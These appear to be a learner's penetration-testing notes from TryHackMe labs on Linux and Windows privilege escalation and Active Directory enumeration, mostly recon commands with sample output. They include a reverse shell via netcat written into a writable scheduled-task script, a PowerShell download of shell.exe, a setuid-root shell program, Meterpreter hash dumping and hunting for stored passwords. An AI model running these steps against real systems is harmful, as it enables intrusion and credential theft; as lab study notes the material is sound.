horizontal - changing unprivileged access
vertical - gaining privileged access

##### accessing THM via openVPN
change to folder with conf. file -> `sudo openvpn USERNAME.ovpn`


## Linux
`id; whoaimi; groups`
to check who I am

`hostname`
can contain usefull info about user

`uname -a`
info about kernel and system versions - check if vulnerable

`cat /proc/version`
kernel, system and additional info (e.g. if `gcc` is installed)


`ls -la /etc/passwd`
check your privileges (maybe you could write?)

`cat /etc/passwd | grep home | cut -d":" -f1`     
```
kali:x:1000:1000:Kali,,,:/home/kali:/usr/bin/zsh
```
users with `home` might be worthier of hacking
hash is in place of "x", or it is in `/etc/shadow`

check if you have access to `/etc/shadow` (not likely)


- look for `SUID` binaries
`find / -type f -perm -04000 -ls 2>/dev/null`
- look for `sudo` users
`sudo -l` list what sudo allows

[GTFObin](https://gtfobins.github.io/)

[when only root-write permission](example/root-write.md)

`getcap -r / 2>/dev/null` ??????

### copy payloads to target
prepare dir with payloads on local machine
create simple python server on local machine in that dir
check your VPN IP (via `ip a` should be visible)

create `/tmp/payloads` on target
`wget http://ATTACK_MACHINE_IP:PORT/linux-peas.sh`
(without specification "what" to download - will download only index.html - you have to be specific)

POC proof of concept

### Payloads:
Linpeas `shell wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh`

LinEnum `shell wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh`


### NFS

``` Target
# shows nfs shares and flags
cat /etc/export
```
flag `not_root_squash` - gives root user **of the client** ability to create files that can be used as root on server

``` Kali
# you can detect & list nfs with
sudo nmap --script=nfs-showmount 10.10.137.205


# create tmp dirs to mount shares to
mkdir -p /tmp/nfs/sharefolder
mkdir -p /tmp/nfs/tmp
mkdir -p /tmp/nfs/backup

# mount shares
sudo mount -t nfs 10.10.137.205:/home/ubuntu/shrefolder /tmp/nfs/sharefolder
sudo mount -t nfs 10.10.137.205:/tmp /tmp/nfs/tmp
sudo mount -t nfs 10.10.137.205:/home/backup tmp/nfs/backup

# cleaning up
sudo unmount /tmp/nfs/sharefolder
sudo unmount /tmp/nfs/tmp
sudo unmount /tmp/nfs/backup

rm -rf /tmp/nfs/sharefolder
rm -rf /tmp/nfs/tmp
rm -rf /tmp/nfs/backup

# to see what is mounted (lok for IP for mounted from other systems)
findmnt
df -aTh
```

``` Kali
# to compile
int main() 
{
   setgid(0);
   setuid(0);
   system("/bin/bash");
   return 0;
}

# compile
sudo su
gcc nfs.c -o nfs -wcat pro
```

## Windows
in meterpreter 
`getuid` 

`load kiwi`
`ps` -> `lsass.exe` look for PID
`migrate 768`
`creds_msv` to retrieve LMNTLM creds
`hashdump` dump of passwd hashes :D

##### RDP
`remote desktop protocol`

`xfreerdp /u:Administrator /p:TryH@ckM3! /cert:ignore /v:3.249.251.67 /w:2000 /h:900`
`/h` & `/w` rozdzielczosc

`hostname`
```
EC2AMAZ-VRVGORG
```
sometimes usefull hostname

`systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type"`
```
OS Name:                   Microsoft Windows Server 2019 Datacenter
OS Version:                10.0.17763 N/A Build 17763
System Type:               x64-based PC
```

`wmic product get name,version,vendor`
```
Name                                                            Vendor                                   Version
Amazon SSM Agent                                                Amazon Web Services                      2.3.722.0
Microsoft Visual C++ 2019 X64 Additional Runtime - 14.24.28127  Microsoft Corporation                    14.24.28127
Java 8 Update 241                                               Oracle Corporation                       8.0.2410.7
AWS Tools for Windows                                           Amazon Web Services Developer Relations  3.15.945
Microsoft Visual C++ 2019 X64 Minimum Runtime - 14.24.28127     Microsoft Corporation                    14.24.28127
Google Update Helper                                            Google LLC                               1.3.35.451
AWS PV Drivers                                                  Amazon Web Services                      8.3.2
Java Auto Updater                                               Oracle Corporation                       2.8.241.7
aws-cfn-bootstrap                                               Amazon Web Services                      1.4.31
```
versions of installed programs

`wmic qfe get Caption,Description,HotFixID,InstalledOn`
```
Caption                                     Description      HotFixID   InstalledOn
http://support.microsoft.com/?kbid=4534119  Update           KB4534119  2/12/2020
http://support.microsoft.com/?kbid=4470502  Update           KB4470502  12/12/2018
http://support.microsoft.com/?kbid=4470788  Security Update  KB4470788  12/12/2018
http://support.microsoft.com/?kbid=4480056  Update           KB4480056  1/9/2019
http://support.microsoft.com/?kbid=4493510  Security Update  KB4493510  4/21/2019
http://support.microsoft.com/?kbid=4499728  Security Update  KB4499728  5/15/2019
http://support.microsoft.com/?kbid=4504369  Security Update  KB4504369  6/12/2019
http://support.microsoft.com/?kbid=4512577  Security Update  KB4512577  9/11/2019
http://support.microsoft.com/?kbid=4512937  Security Update  KB4512937  9/6/2019
http://support.microsoft.com/?kbid=4521862  Security Update  KB4521862  10/9/2019
http://support.microsoft.com/?kbid=4523204  Security Update  KB4523204  11/13/2019
http://support.microsoft.com/?kbid=4524244  Security Update  KB4524244  2/12/2020
http://support.microsoft.com/?kbid=4537759  Security Update  KB4537759  2/12/2020
http://support.microsoft.com/?kbid=4532691  Security Update  KB4532691  2/12/2020
```
last updates

`wmic logicaldisk get caption`
```
Caption
C:
```
looking for outside disks like pendrive. Maybe there are some interesting info

`tasklist /SVC` - prints all processes

`systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type" >> 'C:\Windows\Temp\sys.txt'`
Simple redirection example. For sake of note completeness

`whoami /?`
```
(...)
Examples:
    WHOAMI
    WHOAMI /UPN
    WHOAMI /FQDN
    WHOAMI /LOGONID
    WHOAMI /USER
    WHOAMI /USER /FO LIST
    WHOAMI /USER /FO CSV
    WHOAMI /GROUPS
    WHOAMI /GROUPS /FO CSV /NH
    WHOAMI /CLAIMS
    WHOAMI /CLAIMS /FO LIST
    WHOAMI /PRIV
    WHOAMI /PRIV /FO TABLE
    WHOAMI /USER /GROUPS
    WHOAMI /USER /GROUPS /CLAIMS /PRIV
    WHOAMI /ALL
    WHOAMI /ALL /FO LIST
    WHOAMI /ALL /FO CSV /NH
    WHOAMI /?
```
additional info about `whoami` flags

e.g.
`whoami /priv`
```
PRIVILEGES INFORMATION
----------------------

Privilege Name                            Description                                                        State
========================================= ================================================================== ========
SeIncreaseQuotaPrivilege                  Adjust memory quotas for a process                                 Disabled
SeSecurityPrivilege                       Manage auditing and security log                                   Disabled
SeTakeOwnershipPrivilege                  Take ownership of files or other objects                           Disabled
SeLoadDriverPrivilege                     Load and unload device drivers                                     Disabled
SeSystemProfilePrivilege                  Profile system performance                                         Disabled
SeSystemtimePrivilege                     Change the system time                                             Disabled
SeProfileSingleProcessPrivilege           Profile single process                                             Disabled
SeIncreaseBasePriorityPrivilege           Increase scheduling priority                                       Disabled
SeCreatePagefilePrivilege                 Create a pagefile                                                  Disabled
SeBackupPrivilege                         Back up files and directories                                      Disabled
SeRestorePrivilege                        Restore files and directories                                      Disabled
SeShutdownPrivilege                       Shut down the system                                               Disabled
SeDebugPrivilege                          Debug programs                                                     Enabled
SeSystemEnvironmentPrivilege              Modify firmware environment values                                 Disabled
SeChangeNotifyPrivilege                   Bypass traverse checking                                           Enabled
SeRemoteShutdownPrivilege                 Force shutdown from a remote system                                Disabled
SeUndockPrivilege                         Remove computer from docking station                               Disabled
SeManageVolumePrivilege                   Perform volume maintenance tasks                                   Disabled
SeImpersonatePrivilege                    Impersonate a client after authentication                          Enabled
SeCreateGlobalPrivilege                   Create global objects                                              Enabled
SeIncreaseWorkingSetPrivilege             Increase a process working set                                     Disabled
SeTimeZonePrivilege                       Change the time zone                                               Disabled
SeCreateSymbolicLinkPrivilege             Create symbolic links                                              Disabled
SeDelegateSessionUserImpersonatePrivilege Obtain an impersonation token for another user in the same session Disabled
```

`whoami /groups`
```
GROUP INFORMATION
-----------------

Group Name                                                    Type             SID          Attributes                                         
============================================================= ================ ============ ===============================================================
Everyone                                                      Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group 
NT AUTHORITY\Local account and member of Administrators group Well-known group S-1-5-114    Mandatory group, Enabled by default, Enabled group 
BUILTIN\Administrators                                        Alias            S-1-5-32-544 Mandatory group, Enabled by default, Enabled group, Group owner
BUILTIN\Users                                                 Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group 
NT AUTHORITY\REMOTE INTERACTIVE LOGON                         Well-known group S-1-5-14     Mandatory group, Enabled by default, Enabled group 
NT AUTHORITY\INTERACTIVE                                      Well-known group S-1-5-4      Mandatory group, Enabled by default, Enabled group 
NT AUTHORITY\Authenticated Users                              Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group 
NT AUTHORITY\This Organization                                Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group 
NT AUTHORITY\Local account                                    Well-known group S-1-5-113    Mandatory group, Enabled by default, Enabled group 
LOCAL                                                         Well-known group S-1-2-0      Mandatory group, Enabled by default, Enabled group 
NT AUTHORITY\NTLM Authentication                              Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group 
Mandatory Label\High Mandatory Level                          Label            S-1-16-12288
```

`net user`
```
User accounts for \\EC2AMAZ-VRVGORG

-------------------------------------------------------------------------------
Administrator            DefaultAccount           Guest
WDAGUtilityAccount
The command completed successfully.
```
to get username (**Administrator**)

When you have username you can:
`net user Administrator`
```
User name                    Administrator
Full Name
Comment                      Built-in account for administering the computer/domain
User's comment
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            3/3/2020 7:32:57 PM
Password expires             4/14/2020 7:32:57 PM
Password changeable          3/3/2020 7:32:57 PM
Password required            Yes
User may change password     Yes

Workstations allowed         All
Logon script
User profile
Home directory
Last logon                   8/27/2022 9:15:47 AM

Logon hours allowed          All

Local Group Memberships      *Administrators
Global Group memberships     *None
The command completed successfully.
```

`net localgroup Administrators`
```
Alias name     Administrators
Comment        Administrators have complete and unrestricted access to the computer/domain

Members

-------------------------------------------------------------------------------
Administrator
The command completed successfully.
```
to view other members of `Administrators` group


##### networking
`ipconfig /all`
```
Windows IP Configuration

   Host Name . . . . . . . . . . . . : EC2AMAZ-VRVGORG
   Primary Dns Suffix  . . . . . . . :
   Node Type . . . . . . . . . . . . : Hybrid
   IP Routing Enabled. . . . . . . . : No
   WINS Proxy Enabled. . . . . . . . : No
   DNS Suffix Search List. . . . . . : eu-west-1.ec2-utilities.amazonaws.com
                                       eu-west-1.compute.internal

Ethernet adapter Ethernet:

   Connection-specific DNS Suffix  . : eu-west-1.compute.internal
   Description . . . . . . . . . . . : AWS PV Network Device #0
   Physical Address. . . . . . . . . : 02-30-BD-8F-99-83
   DHCP Enabled. . . . . . . . . . . : Yes
   Autoconfiguration Enabled . . . . : Yes
   Link-local IPv6 Address . . . . . : fe80::7d83:475a:901c:16a1%4(Preferred)
   IPv4 Address. . . . . . . . . . . : 10.10.33.91(Preferred)
   Subnet Mask . . . . . . . . . . . : 255.255.0.0
   Lease Obtained. . . . . . . . . . : Saturday, August 27, 2022 7:35:23 AM
   Lease Expires . . . . . . . . . . : Saturday, August 27, 2022 10:05:23 AM
   Default Gateway . . . . . . . . . : 10.10.0.1
   DHCP Server . . . . . . . . . . . : 10.10.0.1
   DHCPv6 IAID . . . . . . . . . . . : 118418632
   DHCPv6 Client DUID. . . . . . . . : 00-01-00-01-2A-9B-81-7D-02-30-BD-8F-99-83
   DNS Servers . . . . . . . . . . . : 10.0.0.2
   NetBIOS over Tcpip. . . . . . . . : Enabled
```

`route print`
```
===========================================================================
Interface List
  4...02 30 bd 8f 99 83 ......AWS PV Network Device #0
  1...........................Software Loopback Interface 1
===========================================================================

IPv4 Route Table
===========================================================================
Active Routes:
Network Destination        Netmask          Gateway       Interface  Metric
          0.0.0.0          0.0.0.0        10.10.0.1      10.10.33.91     25
        10.10.0.0      255.255.0.0         On-link       10.10.33.91    281
      10.10.33.91  255.255.255.255         On-link       10.10.33.91    281
    10.10.255.255  255.255.255.255         On-link       10.10.33.91    281
        127.0.0.0        255.0.0.0         On-link         127.0.0.1    331
        127.0.0.1  255.255.255.255         On-link         127.0.0.1    331
  127.255.255.255  255.255.255.255         On-link         127.0.0.1    331
  169.254.169.123  255.255.255.255        10.10.0.1      10.10.33.91     50
  169.254.169.249  255.255.255.255        10.10.0.1      10.10.33.91     50
  169.254.169.250  255.255.255.255        10.10.0.1      10.10.33.91     50
  169.254.169.251  255.255.255.255        10.10.0.1      10.10.33.91     50
  169.254.169.253  255.255.255.255        10.10.0.1      10.10.33.91     50
  169.254.169.254  255.255.255.255        10.10.0.1      10.10.33.91     50
        224.0.0.0        240.0.0.0         On-link         127.0.0.1    331
        224.0.0.0        240.0.0.0         On-link       10.10.33.91    281
  255.255.255.255  255.255.255.255         On-link         127.0.0.1    331
  255.255.255.255  255.255.255.255         On-link       10.10.33.91    281
===========================================================================
Persistent Routes:
  Network Address          Netmask  Gateway Address  Metric
  169.254.169.254  255.255.255.255        10.10.0.1      25
  169.254.169.250  255.255.255.255        10.10.0.1      25
  169.254.169.251  255.255.255.255        10.10.0.1      25
  169.254.169.249  255.255.255.255        10.10.0.1      25
  169.254.169.123  255.255.255.255        10.10.0.1      25
  169.254.169.253  255.255.255.255        10.10.0.1      25
===========================================================================

IPv6 Route Table
===========================================================================
Active Routes:
 If Metric Network Destination      Gateway
  1    331 ::1/128                  On-link
  4    281 fe80::/64                On-link
  4    281 fe80::7d83:475a:901c:16a1/128
                                    On-link
  1    331 ff00::/8                 On-link
  4    281 ff00::/8                 On-link
===========================================================================
Persistent Routes:
  None
```

` netstat -ano`
```
Active Connections

  Proto  Local Address          Foreign Address        State           PID
  TCP    0.0.0.0:135            0.0.0.0:0              LISTENING       64
  TCP    0.0.0.0:445            0.0.0.0:0              LISTENING       4
  TCP    0.0.0.0:3389           0.0.0.0:0              LISTENING       1040
  TCP    0.0.0.0:5985           0.0.0.0:0              LISTENING       4
  TCP    0.0.0.0:47001          0.0.0.0:0              LISTENING       4
  TCP    0.0.0.0:49664          0.0.0.0:0              LISTENING       668
  TCP    0.0.0.0:49665          0.0.0.0:0              LISTENING       1224
  TCP    0.0.0.0:49666          0.0.0.0:0              LISTENING       1608
  TCP    0.0.0.0:49667          0.0.0.0:0              LISTENING       2364
  TCP    0.0.0.0:49668          0.0.0.0:0              LISTENING       2424
  TCP    0.0.0.0:49675          0.0.0.0:0              LISTENING       780
  TCP    0.0.0.0:49678          0.0.0.0:0              LISTENING       792
  TCP    10.10.33.91:139        0.0.0.0:0              LISTENING       4
  TCP    10.10.33.91:3389       194.99.105.75:60638    ESTABLISHED     1040
  TCP    [::]:135               [::]:0                 LISTENING       64
  TCP    [::]:445               [::]:0                 LISTENING       4
  TCP    [::]:3389              [::]:0                 LISTENING       1040
  TCP    [::]:5985              [::]:0                 LISTENING       4
  TCP    [::]:47001             [::]:0                 LISTENING       4
  TCP    [::]:49664             [::]:0                 LISTENING       668
  TCP    [::]:49665             [::]:0                 LISTENING       1224
  TCP    [::]:49666             [::]:0                 LISTENING       1608
  TCP    [::]:49667             [::]:0                 LISTENING       2364
  TCP    [::]:49668             [::]:0                 LISTENING       2424
  TCP    [::]:49675             [::]:0                 LISTENING       780
  TCP    [::]:49678             [::]:0                 LISTENING       792
  UDP    0.0.0.0:123            *:*                                    2632
  UDP    0.0.0.0:3389           *:*                                    1040
  UDP    0.0.0.0:5353           *:*                                    1616
  UDP    0.0.0.0:5355           *:*                                    1616
  UDP    10.10.33.91:137        *:*                                    4
  UDP    10.10.33.91:138        *:*                                    4
  UDP    127.0.0.1:59943        *:*                                    2900
  UDP    [::]:123               *:*                                    2632
  UDP    [::]:3389              *:*                                    1040
  UDP    [::]:5353              *:*                                    1616
  UDP    [::]:5355              *:*                                    1616
```

`netsh advfirewall show currentprofile`
```
Public Profile Settings:
----------------------------------------------------------------------
State                                 ON
Firewall Policy                       BlockInbound,AllowOutbound
LocalFirewallRules                    N/A (GPO-store only)
LocalConSecRules                      N/A (GPO-store only)
InboundUserNotification               Disable
RemoteManagement                      Disable
UnicastResponseToMulticast            Enable

Logging:
LogAllowedConnections                 Disable
LogDroppedConnections                 Disable
FileName                              %systemroot%\system32\LogFiles\Firewall\pfirewall.log
MaxFileSize                           4096

Ok.
```

To download "`shell.exe`" from web server
````Shell
(New-Object System.Net.WebClient).Downloadfile("http://<IP>/shell.exe","shell.exe")
````



##### looking for passwd
-   `C:\Unattend.xml`
-   `C:\Windows\Panther\Unattend.xml`
-   `C:\Windows\Panther\Unattend\Unattend.xml`
-   `C:\Windows\system32\sysprep.inf`
-   `C:\Windows\system32\sysprep\sysprep.xml`

leftovers of installation
might exist, and might contain passwords in `base64`

- `type C:\Users\USER\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt` - console history
  `type` command in powershell displays content of a txt file

- `cmdkey /list` - to check if some credentials are saved
`runas /savedcred /user:OTHER_USER cmd.exe` - open `cmd` of other user with creds above probably better to use `powershell.exe` AND you can also use some payload that way (e.g. from `OTHER_USER` `C:\Windows\Temp`)

Web servers also might store passwds (e.g. for `db`s):
-   `C:\...\inetpub\wwwroot\web.config`
-   `C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config`
``` fragment_with_pass
 <connectionStrings>
        <add connectionString="Server=thm-db.local;Database=thm-sekure;User ID=db_admin;Password=098n0x35skjD3" name="THM-DB" />
    </connectionStrings>
```

##### tasks

`schtasks` - list alltasks
look for user-configurated ones

`schtasks /query /tn NAME_OF_TASK_TO_FIND /fo list /v`
here we're looking at task `vulntask`
```
Folder: \
HostName:                             WPRIVESC1
TaskName:                             \vulntask
Next Run Time:                        N/A
Status:                               Ready
Logon Mode:                           Interactive/Background
Last Run Time:                        8/27/2022 10:47:20 AM
Last Result:                          0
Author:                               WPRIVESC1\Administrator
Task To Run:                          C:\tasks\schtask.bat
Start In:                             N/A
Comment:                              N/A
Scheduled Task State:                 Enabled
Idle Time:                            Disabled
Power Management:                     Stop On Battery Mode, No Start On Batteries
Run As User:                          taskusr1
Delete Task If Not Rescheduled:       Disabled
Stop Task If Runs X Hours and X Mins: 72:00:00
Schedule:                             Scheduling data is not available in this format.
Schedule Type:                        At system start up
Start Time:                           N/A
Start Date:                           N/A
End Date:                             N/A
Days:                                 N/A
Months:                               N/A
Repeat: Every:                        N/A
Repeat: Until: Time:                  N/A
Repeat: Until: Duration:              N/A
Repeat: Stop If Still Running:        N/A
```
important:
```
Task To Run:                          C:\tasks\schtask.bat
Run As User:                          taskusr1
```
Maybe you can append sth to execute via `schtask.bat` as user `taskusr1`?

`icacls c:\tasks\schtask.bat`
```
c:\tasks\schtask.bat BUILTIN\Users:(I)(F)
                     NT AUTHORITY\SYSTEM:(I)(F)
                     BUILTIN\Administrators:(I)(F)

Successfully processed 1 files; Failed processing 0 files
```
We see that all users have full (F) access to `schtask.bat`

Listener on Kali:
`netcat -lvnp 4444`

Reverse shell on Target:
`echo c:\tools\nc64.exe -e cmd.exe 10.18.9.175 4444 > C:\tasks\schtask.bat`
`nc64.exe`- `netcat`
Better to use `cmd` for that one. `ps` did a strange thing and appended unknown character to redirection (INVESTIGATE)

`schtasks /run /tn vulntask`

#### AD enum

**For DNS resolution**:
`sudo nvim /etc/systemd/resolved.conf`
add
```
DNS=IP_OF_AD_DC
```
`sudo systemctl restart systemd-resolved.conf`
without this some applications won't be able to resolve (e.g. browser, ssh). Why? I have no idea yet-.-
ArchWiki suggest it should work with only changing the `/etc/resolv.conf` via `NetworkManager` options

Add `AD DC` IP as `DNS` via `NetworkManager GUI` OR directly append
```
nameserver IP_OF_AD_DC
```
to `/etc/resolv.conf`
`sudo systemctl restart NetworkManager`

##### net command
[Net Doc](https://docs.microsoft.com/en-us/troubleshoot/windows-server/networking/net-commands-on-operating-systems)

Used to set the `policy settings` on local computer, such as `account policies` and `password policies`
This command is ONLY used on local computer
(CAN'T be used on domain controller)
BUT
if `/DOMAIN` condition -operation performed on a `domain controller` of the current domain. (otherwise, the operation is performed on the `local computer`)


`net user /domain` - list all AD users
```
vincent.brooks           vincent.price            vincent.wood
vincent.young            wayne.bentley            wayne.harrison
wayne.henderson          wayne.walker             wayne.whitehouse
wendy.carpenter          wendy.evans              wendy.mills
wendy.roberts            wendy.taylor             wendy.whittaker
william.bailey           william.holmes           william.little
william.miah             william.payne            william.williams
yvonne.baker             yvonne.black             yvonne.craig
yvonne.grant             yvonne.johnson           yvonne.smith
zoe.barnes               zoe.ellis                zoe.fleming
zoe.hopkins              zoe.humphreys            zoe.lane
zoe.marshall             zoe.watson
```

`net user natasha.howells /domain` - user details
```
The request will be processed at a domain controller for domain za.tryhackme.com.

User name                    natasha.howells
Full Name                    Natasha Howells
Comment
User's comment
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            2/24/2022 11:04:43 PM
Password expires             Never
Password changeable          2/24/2022 11:04:43 PM
Password required            Yes
User may change password     Yes

Workstations allowed         All
Logon script
User profile
Home directory
Last logon                   Never

Logon hours allowed          All

Local Group Memberships
Global Group memberships     *HR Share RW          *Domain Users
                             *Internet Access
The command completed successfully.
```

`net group /domain` - list all AD groups
```
Group Accounts for \\THMDC.za.tryhackme.com

-------------------------------------------------------------------------------
*Cloneable Domain Controllers
*DnsUpdateProxy
*Domain Admins
*Domain Computers
*Domain Controllers
*Domain Guests
*Domain Users
*Enterprise Admins
*Enterprise Key Admins
*Enterprise Read-only Domain Controllers
*Group Policy Creator Owners
*HR Share RW
*Internet Access
*Key Admins
*Protected Users
*Read-only Domain Controllers
*Schema Admins
*Server Admins
*Tier 0 Admins
*Tier 1 Admins
*Tier 2 Admins
The command completed successfully.
```

`net group "Tier 1 Admins" /domain` - group details
```
Group name     Tier 1 Admins
Comment

Members

-------------------------------------------------------------------------------
t1_arthur.tyler          t1_gary.moss             t1_henry.miller
t1_jill.wallis           t1_joel.stephenson       t1_marian.yates
t1_rosie.bryant
The command completed successfully.
```

`net accounts /domain` - passwd policy
```
Force user logoff how long after time expires?:       Never
Minimum password age (days):                          0
Maximum password age (days):                          Unlimited
Minimum password length:                              0
Length of password history maintained:                None
Lockout threshold:                                    Never
Lockout duration (minutes):                           30
Lockout observation window (minutes):                 30
Computer role:                                        PRIMARY
The command completed successfully.
```

##### powershell

`[System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()` - properties of current domain
```
Forest                  : za.tryhackme.com
DomainControllers       : {THMDC.za.tryhackme.com}
Children                : {}
DomainMode              : Windows2012R2Domain
DomainModeLevel         : 6
Parent                  :
PdcRoleOwner            : THMDC.za.tryhackme.com
RidRoleOwner            : THMDC.za.tryhackme.com
InfrastructureRoleOwner : THMDC.za.tryhackme.com
Name                    : za.tryhackme.com
```

`Get-ADUser -Identity gordon.stevens -Server za.tryhackme.com -Properties *` - list all properties of user
```
AccountExpirationDate                :
accountExpires                       : 9223372036854775807
AccountLockoutTime                   :
AccountNotDelegated                  : False
AllowReversiblePasswordEncryption    : False
AuthenticationPolicy                 : {}
AuthenticationPolicySilo             : {}
BadLogonCount                        : 0
badPasswordTime                      : 0
badPwdCount                          : 0
CannotChangePassword                 : False
CanonicalName                        : za.tryhackme.com/People/Consulting/gordon.stevens
Certificates                         : {}
City                                 :
CN                                   : gordon.stevens
codePage                             : 0
Company                              :
CompoundIdentitySupported            : {}
Country                              :
countryCode                          : 0
Created                              : 2/24/2022 10:06:44 PM
createTimeStamp                      : 2/24/2022 10:06:44 PM
Deleted                              :
Department                           : Consulting
Description                          :
DisplayName                          : Gordon Stevens
DistinguishedName                    : CN=gordon.stevens,OU=Consulting,OU=People,DC=za,DC=tryhackme,DC=com
Division                             :
DoesNotRequirePreAuth                : False
dSCorePropagationData                : {1/1/1601 12:00:00 AM}
EmailAddress                         :
EmployeeID                           :
EmployeeNumber                       :
Enabled                              : True
Fax                                  :
GivenName                            : Gordon
HomeDirectory                        :
HomedirRequired                      : False
HomeDrive                            :
HomePage                             :
HomePhone                            :
Initials                             :
instanceType                         : 4
isDeleted                            :
KerberosEncryptionType               : {}
LastBadPasswordAttempt               :
LastKnownParent                      :
lastLogoff                           : 0
lastLogon                            : 132908987618422496
LastLogonDate                        : 4/29/2022 11:13:07 PM
lastLogonTimestamp                   : 132957439878817675
LockedOut                            : False
logonCount                           : 4
LogonWorkstations                    :
Manager                              :
MemberOf                             : {CN=Internet Access,OU=Groups,DC=za,DC=tryhackme,DC=com}
MNSLogonAccount                      : False
MobilePhone                          :
Modified                             : 4/29/2022 11:13:07 PM
modifyTimeStamp                      : 4/29/2022 11:13:07 PM
msDS-User-Account-Control-Computed   : 0
Name                                 : gordon.stevens
nTSecurityDescriptor                 : System.DirectoryServices.ActiveDirectorySecurity
ObjectCategory                       : CN=Person,CN=Schema,CN=Configuration,DC=za,DC=tryhackme,DC=com
ObjectClass                          : user
ObjectGUID                           : 48ddd5f1-37ae-4040-a281-47dd58313fcb
objectSid                            : S-1-5-21-3330634377-1326264276-632209373-3058
Office                               :
OfficePhone                          :
Organization                         :
OtherName                            :
PasswordExpired                      : False
PasswordLastSet                      : 2/24/2022 10:06:44 PM
PasswordNeverExpires                 : False
PasswordNotRequired                  : False
POBox                                :
PostalCode                           :
primaryGroupID                       : 513
PrincipalsAllowedToDelegateToAccount : {}
ProfilePath                          :
ProtectedFromAccidentalDeletion      : False
pwdLastSet                           : 132902140043901058
SamAccountName                       : gordon.stevens
sAMAccountType                       : 805306368
ScriptPath                           :
sDRightsEffective                    : 0
ServicePrincipalNames                : {}
SID                                  : S-1-5-21-3330634377-1326264276-632209373-3058
SIDHistory                           : {}
SmartcardLogonRequired               : False
sn                                   : Stevens
State                                :
Title                                : Mid-level
TrustedForDelegation                 : False
TrustedToAuthForDelegation           : False
UseDESKeyOnly                        : False
userAccountControl                   : 512
userCertificate                      : {}
UserPrincipalName                    :
uSNChanged                           : 103860
uSNCreated                           : 30825
whenChanged                          : 4/29/2022 11:13:07 PM
whenCreated                          : 2/24/2022 10:06:44 PM
```

`Get-ADUser -Filter 'Name -like "*stevens"' -Server za.tryhackme.com | Format-Table Name,SamAccountName -A` - find users with string "stevens" in username
```
Name             SamAccountName
----             --------------
chloe.stevens    chloe.stevens
samantha.stevens samantha.stevens
mohammed.stevens mohammed.stevens
jacob.stevens    jacob.stevens
timothy.stevens  timothy.stevens
trevor.stevens   trevor.stevens
owen.stevens     owen.stevens
jane.stevens     jane.stevens
janice.stevens   janice.stevens
gordon.stevens   gordon.stevens
```

`Get-ADGroup -Identity Administrators -Server za.tryhackme.com` - list properties of `Administrators` group
```
DistinguishedName : CN=Administrators,CN=Builtin,DC=za,DC=tryhackme,DC=com
GroupCategory     : Security
GroupScope        : DomainLocal
Name              : Administrators
ObjectClass       : group
ObjectGUID        : f4d1cbcd-4a6f-4531-8550-0394c3273c4f
SamAccountName    : Administrators
SID               : S-1-5-32-544
```

`Get-ADGroup -Identity Administrators -Server za.tryhackme.com -Properties *` - all properties of `Administrators` group
```
adminCount                      : 1
CanonicalName                   : za.tryhackme.com/Builtin/Administrators
CN                              : Administrators
Created                         : 2/24/2022 9:57:34 PM
createTimeStamp                 : 2/24/2022 9:57:34 PM
Deleted                         :
Description                     : Administrators have complete and unrestricted access to the computer/domain
DisplayName                     :
DistinguishedName               : CN=Administrators,CN=Builtin,DC=za,DC=tryhackme,DC=com
dSCorePropagationData           : {2/24/2022 10:13:48 PM, 2/24/2022 9:58:38 PM, 1/1/1601 12:04:16 AM}
GroupCategory                   : Security
GroupScope                      : DomainLocal
groupType                       : -2147483643
HomePage                        :
instanceType                    : 4
isCriticalSystemObject          : True
isDeleted                       :
LastKnownParent                 :
ManagedBy                       :
member                          : {CN=Domain Admins,CN=Users,DC=za,DC=tryhackme,DC=com, CN=Enterprise
                                  Admins,CN=Users,DC=za,DC=tryhackme,DC=com, CN=vagrant,CN=Users,DC=za,DC=tryhackme,DC=com,
                                  CN=Administrator,CN=Users,DC=za,DC=tryhackme,DC=com}
MemberOf                        : {}
Members                         : {CN=Domain Admins,CN=Users,DC=za,DC=tryhackme,DC=com, CN=Enterprise
                                  Admins,CN=Users,DC=za,DC=tryhackme,DC=com, CN=vagrant,CN=Users,DC=za,DC=tryhackme,DC=com,
                                  CN=Administrator,CN=Users,DC=za,DC=tryhackme,DC=com}
Modified                        : 2/24/2022 10:13:48 PM
modifyTimeStamp                 : 2/24/2022 10:13:48 PM
Name                            : Administrators
nTSecurityDescriptor            : System.DirectoryServices.ActiveDirectorySecurity
ObjectCategory                  : CN=Group,CN=Schema,CN=Configuration,DC=za,DC=tryhackme,DC=com
ObjectClass                     : group
ObjectGUID                      : f4d1cbcd-4a6f-4531-8550-0394c3273c4f
objectSid                       : S-1-5-32-544
ProtectedFromAccidentalDeletion : False
SamAccountName                  : Administrators
sAMAccountType                  : 536870912
sDRightsEffective               : 0
SID                             : S-1-5-32-544
SIDHistory                      : {}
systemFlags                     : -1946157056
uSNChanged                      : 31686
uSNCreated                      : 8200
whenChanged                     : 2/24/2022 10:13:48 PM
whenCreated                     : 2/24/2022 9:57:34 PM
```

`Get-ADGroupMember -Identity Administrators -Server za.tryhackme.com` - list memebers of `Administrators` group
```
distinguishedName : CN=Domain Admins,CN=Users,DC=za,DC=tryhackme,DC=com
name              : Domain Admins
objectClass       : group
objectGUID        : 8a6186e5-e20f-4f13-b1b0-067f3326f67c
SamAccountName    : Domain Admins
SID               : S-1-5-21-3330634377-1326264276-632209373-512

distinguishedName : CN=Enterprise Admins,CN=Users,DC=za,DC=tryhackme,DC=com
name              : Enterprise Admins
objectClass       : group
objectGUID        : 93846b04-25b9-4915-baca-e98cce4541c6
SamAccountName    : Enterprise Admins
SID               : S-1-5-21-3330634377-1326264276-632209373-519

distinguishedName : CN=vagrant,CN=Users,DC=za,DC=tryhackme,DC=com
name              : vagrant
objectClass       : user
objectGUID        : ed901eff-9ec0-4851-ba32-7a26a8f0858f
SamAccountName    : vagrant
SID               : S-1-5-21-3330634377-1326264276-632209373-1000

